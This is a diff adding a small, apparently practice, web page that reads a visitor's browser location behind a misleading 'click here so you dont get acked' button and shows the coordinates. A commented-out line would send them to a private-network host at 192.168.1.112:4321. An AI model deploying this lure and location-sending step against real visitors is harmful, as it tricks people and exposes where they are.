@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]>      <html class="no-js"> <!--<![endif]-->
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title></title>
+    <meta name="description" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="" />
+  </head>
+  <body>
+    <p>This site allows me to see your location</p>
+
+    <button onclick="getLocation()">click here so you dont get acked</button>
+
+    <p id="demo"></p>
+    <script>
+      var x = document.getElementById("demo");
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            showPosition,
+            errorCallback,
+            { timeout: 10000 }
+          );
+        } else {
+          x.innerHTML = "GeoLocation is not supported by this browser";
+        }
+      }
+      function showPosition(position) {
+        var latlong = (x.innerHTML =
+          "Latatude: " +
+          position.coords.latitude +
+          "<br> longatude: " +
+          position.coords.longitude);
+        //document.location = "http://192.168.1.112:4321/" + latlong;
+      }
+
+      function errorCallback(error) {
+        x.innerHTML = "failed";
+      }
+    </script>
+  </body>
+</html>
